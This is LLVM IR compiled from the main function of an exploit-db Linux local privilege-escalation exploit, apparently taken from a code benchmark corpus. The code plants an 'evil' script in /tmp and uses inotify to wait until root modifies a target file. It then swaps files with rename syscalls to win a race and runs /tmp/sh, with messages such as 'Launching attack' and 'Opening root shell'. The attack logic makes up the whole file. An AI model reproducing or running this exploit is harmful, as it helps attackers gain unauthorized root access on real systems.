; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_38357.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_38357.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"/tmp/evil\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"/tmp/trash\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Usage: %s <target file> \0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"[*] Launching attack against \22%s\22\0A\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"[+] Creating evil script (/tmp/evil)\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/tmp/%s\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"/usr/bin/touch %s\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"[+] Creating target file (%s)\0A\00", align 1
@.str.8 = private unnamed_addr constant [30 x i8] c"[+] Initialize inotify on %s\0A\00", align 1
@IN_MODIFY = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [38 x i8] c"[+] Waiting for root to modify :\22%s\22\0A\00", align 1
@SYS_read = common dso_local global i32 0, align 4
@SYS_rename = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [34 x i8] c"[+] Opening root shell (/tmp/sh)\0A\00", align 1
@.str.11 = private unnamed_addr constant [48 x i8] c"rm -fr /tmp/trash;/tmp/sh || echo \22[-] Failed.\22\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %11, align 8
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8** %12, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %18)
  store i32 1, i32* %3, align 4
  br label %71

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0), i8* %23)
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0))
  %26 = load i8*, i8** %11, align 8
  %27 = call i32 @create_nasty_shell(i8* %26)
  %28 = call i8* @malloc(i32 40)
  store i8* %28, i8** %9, align 8
  %29 = call i8* @malloc(i32 32)
  store i8* %29, i8** %10, align 8
  %30 = load i8*, i8** %9, align 8
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @sprintf(i8* %30, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* %33)
  %35 = load i8*, i8** %10, align 8
  %36 = load i8*, i8** %9, align 8
  %37 = call i32 @sprintf(i8* %35, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i8* %36)
  %38 = load i8*, i8** %10, align 8
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i8* %38)
  %40 = load i8*, i8** %10, align 8
  %41 = call i32 @system(i8* %40)
  %42 = load i8*, i8** %9, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0), i8* %42)
  %44 = call i32 (...) @inotify_init()
  store i32 %44, i32* %6, align 4
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %9, align 8
  %47 = load i32, i32* @IN_MODIFY, align 4
  %48 = call i32 @inotify_add_watch(i32 %45, i8* %46, i32 %47)
  store i32 %48, i32* %7, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.9, i64 0, i64 0), i8* %51)
  %53 = load i32, i32* @SYS_read, align 4
  %54 = load i32, i32* %6, align 4
  %55 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  %56 = call i32 (i32, ...) @syscall(i32 %53, i32 %54, i8* %55, i32 1)
  %57 = load i32, i32* @SYS_rename, align 4
  %58 = load i8*, i8** %9, align 8
  %59 = load i8*, i8** %12, align 8
  %60 = call i32 (i32, ...) @syscall(i32 %57, i8* %58, i8* %59)
  %61 = load i32, i32* @SYS_rename, align 4
  %62 = load i8*, i8** %11, align 8
  %63 = load i8*, i8** %9, align 8
  %64 = call i32 (i32, ...) @syscall(i32 %61, i8* %62, i8* %63)
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @inotify_rm_watch(i32 %65, i32 %66)
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.10, i64 0, i64 0))
  %69 = call i32 @sleep(i32 2)
  %70 = call i32 @system(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %71

71:                                               ; preds = %20, %15
  %72 = load i32, i32* %3, align 4
  ret i32 %72
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @create_nasty_shell(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @syscall(i32, ...) #1

declare dso_local i32 @inotify_rm_watch(i32, i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
